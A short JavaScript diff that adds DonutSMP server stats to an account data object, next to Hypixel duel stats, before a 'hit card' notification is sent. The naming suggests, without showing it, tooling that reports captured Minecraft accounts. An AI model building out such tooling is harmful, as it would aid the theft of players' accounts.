@@ -59,7 +59,13 @@ async function triggerHitNotification(client, acc, uid) {
             duelKDR: stats?.duelKDR || '0',
             duelWinstreak: stats?.duelWinstreak || '0',
             plusColour: stats?.plusColour || 'None',
-            gifted: stats?.gifted || '0'
+            gifted: stats?.gifted || '0',
+            donut: acc.donut || null,
+            donutMoney: acc.donutMoney || acc.donut?.moneyFormatted || acc.donut?.money || null,
+            donutShards: acc.donutShards || acc.donut?.shardsFormatted || acc.donut?.shards || null,
+            donutPlaytime: acc.donutPlaytime || acc.donut?.playtime || null,
+            donutRank: acc.donutRank || acc.donut?.rank || null,
+            donutKDR: acc.donutKDR || acc.donut?.kdr || null
         };
         await sendSecureNotification(client, accountData);
         console.log(`[HIT_DRAW] Hit card notification sent successfully for ${ign}`);
